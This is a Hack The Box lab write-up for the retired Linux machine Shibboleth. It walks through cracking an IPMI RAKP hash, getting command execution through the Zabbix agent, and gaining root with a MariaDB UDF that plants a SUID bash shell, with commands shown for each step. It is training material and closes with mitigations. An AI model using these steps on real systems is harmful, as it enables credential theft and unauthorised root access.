---
machine: Shibboleth
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, ipmi, zabbix, mysql, udf, privesc]
---

# Shibboleth — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference note; no real flags or credentials.

## TL;DR

A static site hints at BMC automation. IPMI 2.0 on UDP/623 leaks a RAKP hash that cracks into Zabbix. The Zabbix agent executes commands and yields a shell; credential reuse reaches `ipmi`, and a MariaDB/MySQL CVE with shared-object loading gives root.

## Recon

```bash
nmap -Pn -sCV -p22,80,10050,10051 <IP>
nmap -sU -p623 <IP>
```

- Ports: `22/tcp` SSH, `80/tcp` HTTP, `10050-10051/tcp` Zabbix and `623/udp` IPMI.
- Services: Static site, IPMI, Zabbix server/agent and MariaDB.
- Technologies: IPMI 2.0, Zabbix, MySQL/MariaDB and UDF.

## Enumeration

- `shibboleth.htb` with few visible clues.
- IPMI responds on UDP/623.
- Zabbix on port 80 with a valid account.
- Zabbix agent and a local MariaDB instance.

## Foothold

Run the IPMI RAKP hash scanner and crack the hash. The password grants Zabbix access; with admin rights, configure a check that runs a command on the agent and returns a shell.

```bash
msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <IP>; run'
hashcat -m 7300 ipmi.hash /usr/share/wordlists/rockyou.txt
# Log in to Zabbix and create a system.run item
ssh <USER>@shibboleth.htb
```

## Lateral movement

The Zabbix password is reused for the `ipmi` user; from there, enumerate MariaDB and local permissions.

## Privilege escalation

The MariaDB version allows loading a shared library as root. Compile a `.so` with a function that runs a shell, copy it to an allowed directory and register it as a UDF.

```bash
mysql -u root -p
# Compile the .so and copy it to /usr/lib/mysql/plugin/
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('/bin/bash -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"');
/tmp/rootbash -p
```

## Evidence

- IPMI RAKP hash captured and cracked.
- Command execution through the Zabbix agent.
- Loaded UDF and SUID root shell.

## Lessons learned

- IPMI 2.0 still exposes crackable hashes.
- Poorly segmented Zabbix allows execution on agents.
- Databases with writable plugin directories are RCE.

## Mitigation and detection

- Restrict IPMI to a management network and use strong passwords.
- Limit Zabbix administration and agent actions.
- Run MariaDB unprivileged and lock down `plugin_dir`.

## References

- [0xdf — Shibboleth](https://0xdf.gitlab.io/2022/04/02/htb-shibboleth.html)
- [IppSec — Shibboleth](https://www.youtube.com/watch?v=tVXGM10kRwY)
- [Hack The Box — Shibboleth](https://app.hackthebox.com/machines/shibboleth)
